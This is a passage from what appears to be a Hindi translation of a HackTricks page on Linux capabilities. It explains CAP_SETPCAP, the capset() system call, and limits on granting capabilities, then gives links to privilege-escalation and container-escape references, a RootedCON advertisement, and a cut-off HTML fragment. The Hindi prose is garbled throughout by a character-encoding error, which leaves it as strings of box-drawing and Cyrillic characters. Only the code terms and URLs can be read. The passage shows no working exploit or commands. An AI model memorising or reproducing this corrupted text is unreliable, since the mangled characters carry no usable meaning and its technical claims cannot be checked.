`CAP_SETPCAP` рд╡рд╛рд▓реА рдкреНрд░рдХреНрд░рд┐рдпрд╛ **рдХреЗрд╡рд▓ рдЙрдиреНрд╣реАрдВ рдХреНрд╖рдорддрд╛рдУрдВ рдХреЛ рдкреНрд░рджрд╛рди рдпрд╛ рд╣рдЯрд╛ рд╕рдХрддреА рд╣реИ рдЬреЛ рдЙрд╕рдХреА рдЕрдиреБрдордд рдХреНрд╖рдорддрд╛ рд╕реЗрдЯ рдореЗрдВ рд╣реИрдВ**ред рдЕрдиреНрдп рд╢рдмреНрджреЛрдВ рдореЗрдВ, рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЙрд╕ рдХреНрд╖рдорддрд╛ рдХреЛ рджреВрд╕рд░реА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдкреНрд░рджрд╛рди рдирд╣реАрдВ рдХрд░ рд╕рдХрддреА рд╣реИ рдЬрд┐рд╕рдХреА рд╡рд╣ рдЦреБрдж рдХреА рдХреНрд╖рдорддрд╛ рдирд╣реАрдВ рд╣реИред рдпрд╣ рдкреНрд░рддрд┐рдмрдВрдз рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЕрдкрдиреЗ рд╕реНрд╡рдпрдВ рдХреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╕реЗ рдмрд╛рд╣рд░ рджреВрд╕рд░реА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреА рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдХреЛ рдмрдврд╝рд╛рдиреЗ рд╕реЗ рд░реЛрдХрддрд╛ рд╣реИред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рд╣рд╛рд▓ рдХреЗ рдХрд░реНрдирд▓ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдореЗрдВ, `CAP_SETPCAP` рдХреНрд╖рдорддрд╛ рдХреЛ **рдФрд░ рдЕрдзрд┐рдХ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ**ред рдЕрдм рдпрд╣ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЕрдиреНрдп рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреА рдХреНрд╖рдорддрд╛ рд╕реЗрдЯ рдХреЛ рдЕрдирд┐рдпрдорд┐рдд рд░реВрдк рд╕реЗ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджреЗрддрд╛ рд╣реИред рдЗрд╕рдХреА рдмрдЬрд╛рдп, рдпрд╣ рдХреЗрд╡рд▓ рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЕрдкрдиреА рдЕрдиреБрдордд рдХреНрд╖рдорддрд╛ рд╕реЗрдЯ рдпрд╛ рдЕрдкрдиреЗ рд╡рдВрд╢рдЬреЛрдВ рдХреА рдЕрдиреБрдордд рдХреНрд╖рдорддрд╛ рд╕реЗрдЯ рдореЗрдВ рдХреНрд╖рдорддрд╛рдУрдВ рдХреЛ рдХрдо рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдЗрд╕ рдкрд░рд┐рд╡рд░реНрддрди рдХреЛ рдХреНрд╖рдорддрд╛ рдХреЗ рд╕рд╛рде рд╕рдВрдмрдВрдзрд┐рдд рд╕рдВрднрд╛рд╡рд┐рдд рд╕реБрд░рдХреНрд╖рд╛ рдЬреЛрдЦрд┐рдореЛрдВ рдХреЛ рдХрдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред

`CAP_SETPCAP` рдХреЛ рд╕рдХреНрд░рд┐рдп рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдкрдХреЛ рдЕрдкрдиреА рдкреНрд░рднрд╛рд╡реА рдХреНрд╖рдорддрд╛ рд╕реЗрдЯ рдореЗрдВ рдХреНрд╖рдорддрд╛ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП рдФрд░ рд▓рдХреНрд╖рд┐рдд рдХреНрд╖рдорддрд╛рдПрдВ рдЕрдкрдиреА рдЕрдиреБрдордд рдХреНрд╖рдорддрд╛ рд╕реЗрдЯ рдореЗрдВ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдПред рдлрд┐рд░ рдЖрдк `capset()` рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдиреНрдп рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреА рдХреНрд╖рдорддрд╛ рд╕реЗрдЯ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рд╕рд╛рд░рд╛рдВрд╢ рдореЗрдВ, `CAP_SETPCAP` рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЕрдиреНрдп рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреА рдХреНрд╖рдорддрд╛ рд╕реЗрдЯ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ рдЙрди рдХреНрд╖рдорддрд╛рдУрдВ рдХреЛ рдкреНрд░рджрд╛рди рдирд╣реАрдВ рдХрд░ рд╕рдХрддреА рд╣реИ рдЬрд┐рдирдХреА рд╡рд╣ рдЦреБрдж рдХреЗ рдкрд╛рд╕ рдирд╣реАрдВ рд╣реИред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рд╕реБрд░рдХреНрд╖рд╛ рд╕рдВрдмрдВрдзреА рдЪрд┐рдВрддрд╛рдУрдВ рдХреЗ рдХрд╛рд░рдг, рд╣рд╛рд▓ рдХреЗ рдХрд░реНрдирд▓ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдореЗрдВ рдЗрд╕рдХреА рдХреНрд╖рдорддрд╛ рдХреЛ рдХреЗрд╡рд▓ рдЕрдкрдиреА рдЕрдиреБрдордд рдХреНрд╖рдорддрд╛ рд╕реЗрдЯ рдпрд╛ рдЕрдкрдиреЗ рд╡рдВрд╢рдЬреЛрдВ рдХреА рдЕрдиреБрдордд рдХреНрд╖рдорддрд╛ рд╕реЗрдЯ рдореЗрдВ рдХреНрд╖рдорддрд╛рдУрдВ рдХреЛ рдХрдо рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИред

## рд╕рдВрджрд░реНрдн

**рдЗрди рдЙрджрд╛рд╣рд░рдгреЛрдВ рдХрд╛ рдЕрдзрд┐рдХрд╛рдВрд╢** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com) **рдХреЗ рдХреБрдЫ рдкреНрд░рдпреЛрдЧрд╢рд╛рд▓рд╛рдУрдВ рд╕реЗ рд▓рд┐рдП рдЧрдП рд╣реИрдВ**, рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рдЖрдк рдЗрди рдкреНрд░рд┐рд╡реЗрд╕реНрдХ рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЕрднреНрдпрд╛рд╕ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ рдореИрдВ рдЗрди рдкреНрд░рдпреЛрдЧрд╢рд╛рд▓рд╛рдУрдВ рдХреА рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХрд░рддрд╛ рд╣реВрдВред

**рдЕрдиреНрдп рд╕рдВрджрд░реНрдн**:

* [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
* [https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/#:\~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.](https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/)
* [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
* [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module)
* [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)

тАЛ

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) **рд╕реНрдкреЗрди** рдореЗрдВ рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдШрдЯрдирд╛ рд╣реИ рдФрд░ рдпреВрд░реЛрдк рдореЗрдВ рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдореЗрдВ рд╕реЗ рдПрдХ рд╣реИред **рддрдХрдиреАрдХреА рдЬреНрдЮрд╛рди рдХреЛ рдмрдврд╝рд╛рд╡рд╛ рджреЗрдиреЗ** рдХреЗ рдорд┐рд╢рди рдХреЗ рд╕рд╛рде, рдпрд╣ рдХрд╛рдВрдЧреНрд░реЗрд╕ рд╣рд░ рд╡рд┐рд╖рдп рдореЗрдВ рдЯреЗрдХреНрдиреЛрд▓реЙрдЬреА рдФрд░ рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рд╢реЗрд╖рдЬреНрдЮреЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрдмрд▓рддрд╛ рд╣реБрдЖ рдорд┐рд▓рди рд╕реНрдерд▓ рд╣реИред

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hack
